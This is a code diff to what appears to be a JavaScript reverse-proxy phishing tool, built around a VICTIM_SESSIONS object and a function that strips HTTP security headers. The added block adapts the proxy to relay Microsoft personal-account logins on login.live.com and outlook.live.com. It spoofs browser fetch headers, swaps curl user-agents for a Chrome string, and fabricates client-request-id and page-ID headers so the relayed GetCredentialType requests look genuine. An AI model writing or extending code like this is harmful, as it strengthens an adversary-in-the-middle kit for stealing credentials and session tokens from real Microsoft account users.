@@ -1108,6 +1108,45 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
             proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
         }
     }
+    
+    // Special handling for personal accounts (login.live.com)
+    if (VICTIM_SESSIONS[currentSession].hostname === 'login.live.com' || 
+        VICTIM_SESSIONS[currentSession].hostname === 'outlook.live.com') {
+        // Ensure critical headers for personal accounts
+        if (!proxyRequestOptions.headers['accept']) {
+            proxyRequestOptions.headers['accept'] = 'application/json, text/plain, */*';
+        }
+        if (!proxyRequestOptions.headers['accept-language']) {
+            proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-dest']) {
+            proxyRequestOptions.headers['sec-fetch-dest'] = 'empty';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-mode']) {
+            proxyRequestOptions.headers['sec-fetch-mode'] = 'cors';
+        }
+        if (!proxyRequestOptions.headers['sec-fetch-site']) {
+            proxyRequestOptions.headers['sec-fetch-site'] = 'same-origin';
+        }
+        // Fix user-agent if needed
+        if (proxyRequestOptions.headers['user-agent'] && proxyRequestOptions.headers['user-agent'].includes('curl')) {
+            proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+        }
+        // Ensure proper content-type for JSON requests
+        if (proxyRequestBody && proxyRequestBody.toString().includes('GetCredentialType')) {
+            proxyRequestOptions.headers['content-type'] = 'application/json; charset=UTF-8';
+        }
+        // Add client-request-id if missing (Microsoft uses this for tracking)
+        if (!proxyRequestOptions.headers['client-request-id']) {
+            proxyRequestOptions.headers['client-request-id'] = generateRandomString(36).toLowerCase();
+        }
+        // Add canary header if missing
+        if (!proxyRequestOptions.headers['canary'] && proxyRequestOptions.path.includes('GetCredentialType')) {
+            // This is a placeholder - in a real scenario you'd extract this from the page
+            proxyRequestOptions.headers['hpgid'] = '33';
+            proxyRequestOptions.headers['hpgact'] = '0';
+        }
+    }
 }
 
 function deleteHTTPSecurityResponseHeaders(headers) {
